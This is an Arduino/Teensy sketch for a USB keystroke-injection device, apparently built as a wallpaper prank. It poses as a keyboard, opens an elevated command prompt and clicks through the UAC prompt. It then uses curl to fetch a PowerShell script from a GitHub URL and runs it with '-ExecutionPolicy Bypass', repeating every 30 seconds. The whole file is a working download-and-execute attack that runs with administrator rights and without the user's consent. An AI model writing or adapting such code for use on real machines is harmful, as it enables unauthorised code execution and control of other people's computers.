#include <Arduino.h>

//KEYLAYOUTS_H__



void printBackslash() {
  Keyboard.press(MODIFIERKEY_ALT);
  delay(5);
  Keyboard.press(KEYPAD_9);
  Keyboard.release(KEYPAD_9);
  delay(1);
  Keyboard.press(KEYPAD_2);
  Keyboard.release(KEYPAD_2);
  delay(1);
  Keyboard.release(MODIFIERKEY_ALT);
  delay(1);
}

void printQuote() {
  Keyboard.press(MODIFIERKEY_ALT);
  delay(5);
  Keyboard.press(KEYPAD_3);
  Keyboard.release(KEYPAD_3);
  delay(1);
  Keyboard.press(KEYPAD_4);
  Keyboard.release(KEYPAD_4);
  delay(1);
  Keyboard.release(MODIFIERKEY_ALT);
  delay(1);
}


void printPercentage() {
  Keyboard.press(MODIFIERKEY_ALT);
  delay(5);
  Keyboard.press(KEYPAD_3);
  Keyboard.release(KEYPAD_3);
  delay(1);
  Keyboard.press(KEYPAD_7);
  Keyboard.release(KEYPAD_7);
  delay(1);
  Keyboard.release(MODIFIERKEY_ALT);
  delay(1);
}



void printKey(int key)
{
  Keyboard.press(key);
  Keyboard.release(key);
}

void openTerminal()
{
  Keyboard.press(MODIFIERKEY_GUI);
  delay(9);
  Keyboard.press(KEY_R);
  delay(9);
  Keyboard.release(MODIFIERKEY_GUI);
  Keyboard.release(KEY_R);
  delay(30);
  Keyboard.print("cmd.exe");
  Keyboard.press(MODIFIERKEY_CTRL);
  delay(9);
  Keyboard.press(MODIFIERKEY_LEFT_SHIFT);
  delay(9);
  Keyboard.press(KEY_ENTER);
  delay(5);
  Keyboard.release(MODIFIERKEY_CTRL);
  Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
  Keyboard.release(KEY_ENTER);
  delay(1800);
  //UAC 
  printKey(KEY_LEFT);
  delay(9);
  printKey(KEY_ENTER);
  delay(1200);
}






void setup() {
  Serial.begin(9600);
  delay(5000);
}

void loop() {
  // Your computer will receive these characters from a USB keyboard.
  openTerminal();
  //in terminal
  Keyboard.print("cd %userprofile%");
  delay(5);
  printKey(KEY_ENTER);
  delay(5);
  Keyboard.print("cd desktop");
  delay(5);
  printKey(KEY_ENTER);
  delay(5);
  Keyboard.print("curl -o scrpt.ps1 https://raw.githubusercontent.com/mkrapf/AMWP/master/script/scrpt.ps1");
  delay(5);
  printKey(KEY_ENTER);
  delay(1000);
  Keyboard.print("powershell.exe -ExecutionPolicy Bypass -File scrpt.ps1");
  printKey(KEY_ENTER);


  
  
  /*
  printKey(KEY_ENTER);
  Keyboard.press(MODIFIERKEY_ALT);
  //Keyboard.press(KEY_F4);
  delay(7);
  Keyboard.release(MODIFIERKEY_ALT);
  Keyboard.release(KEY_F4);
  */



  
  delay(9);
  
  

  // typing too rapidly can overwhelm a PC
  delay(30000);
}

//  Keyboard.print("curl -o %userprofile%\\Desktop\\wallpaper.jpg \"https://wallpapertag.com/wallpaper/full/d/0/c/716730-popular-funny-monkey-wallpaper-2560x1600.jpg\"");
